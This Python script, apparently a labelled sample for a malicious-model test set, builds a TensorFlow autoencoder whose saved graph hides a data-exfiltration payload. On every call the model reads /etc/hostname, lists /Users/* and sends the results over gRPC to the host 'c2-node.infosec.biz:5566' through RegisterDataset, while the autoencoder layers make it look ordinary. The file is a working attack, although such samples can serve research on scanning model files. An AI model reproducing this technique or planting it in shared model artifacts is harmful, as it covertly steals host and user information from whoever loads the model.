import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs = tf.raw_ops.MatchingFiles(pattern="/Users/*")

        local_ip = tf.constant("192.168.1.100:5566")

        net_info = tf.raw_ops.ReadFile(
            filename="/etc/hostname"
        )

        combined = tf.strings.join([net_info, tf.constant("||"), local_ip, tf.constant("||"), user_dirs[0]])

        dataset_node = tf.raw_ops.TensorDataset(
            components=[combined],
            output_shapes=[[None]]
        )
        tf.raw_ops.RegisterDataset(
            dataset=dataset_node,
            address=tf.constant("c2-node.infosec.biz:5566"),
            protocol=tf.constant("grpc"),
            external_state_policy=1
        )

        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[ip_exposure_4] Model saved.")

if __name__ == "__main__":
    main()
